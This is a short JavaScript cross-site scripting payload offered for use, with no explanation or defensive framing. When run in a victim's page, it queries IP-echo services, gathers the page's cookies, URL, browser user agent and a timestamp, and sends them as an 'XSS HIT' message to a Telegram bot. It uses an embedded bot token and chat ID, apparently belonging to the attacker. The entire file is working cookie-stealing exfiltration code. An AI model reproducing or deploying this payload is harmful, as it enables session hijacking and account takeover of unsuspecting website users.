(async function () {
    // Try a few IP-echo services in case one is blocked
    const ipServices = [
        "https://api.ipify.org?format=json",
        "https://ipinfo.io/json",
        "https://ifconfig.me/all.json"
    ];

    let ip = "unknown";
    for (const url of ipServices) {
        try {
            const r = await fetch(url);
            const j = await r.json();
            ip = j.ip || j.query || (j.ip_addr) || "unknown";
            if (ip !== "unknown") break;
        } catch (e) { /* try next */ }
    }

    const payload = {
        cookie: document.cookie,
        ip:     ip,
        url:    location.href,
        ua:     navigator.userAgent,
        time:   new Date().toISOString()
    };

    try {
        const r = await fetch(
            "https://api.telegram.org/bot8369821788:AAHW7vi8nU1SfAPxEBQGMW722Ygy3-MliT8/sendMessage",
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: "-1004334353940",
                    text: "💥 XSS HIT\n" + JSON.stringify(payload, null, 2)
                })
            }
        );
        const d = await r.json();
        console.log("[+] sent", d);
    } catch (e) {
        console.error("[-] send err", e);
    }
})();
